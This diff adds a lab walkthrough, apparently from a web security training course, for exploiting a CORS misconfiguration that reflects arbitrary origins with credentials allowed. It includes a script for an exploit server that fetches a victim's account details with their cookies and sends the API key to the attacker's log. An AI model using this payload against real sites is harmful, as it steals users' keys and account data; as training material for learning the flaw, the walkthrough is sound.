@@ -180,7 +180,29 @@ is not permitted as this would be dangerously insecure, exposing any authenticat
                                       
                                       
 
+ Example: 
+STEP1: Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.  
 
+STEP2: Send the request to Burp Repeater, and resubmit it with the added header:
+       Origin: https://example.com
+
+STEP3:  Observe that the origin is reflected in the Access-Control-Allow-Origin header. 
+
+STEP4: In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL: 
+
+                                                  <script>
+                                                      var req = new XMLHttpRequest();
+                                                      req.onload = reqListener;
+                                                      req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+                                                      req.withCredentials = true;
+                                                      req.send();
+
+                                                      function reqListener() {
+                                                          location='/log?key='+this.responseText;
+                                                      };
+                                                  </script>
+                                                  
+                                                  
                                 
                                             
                                               
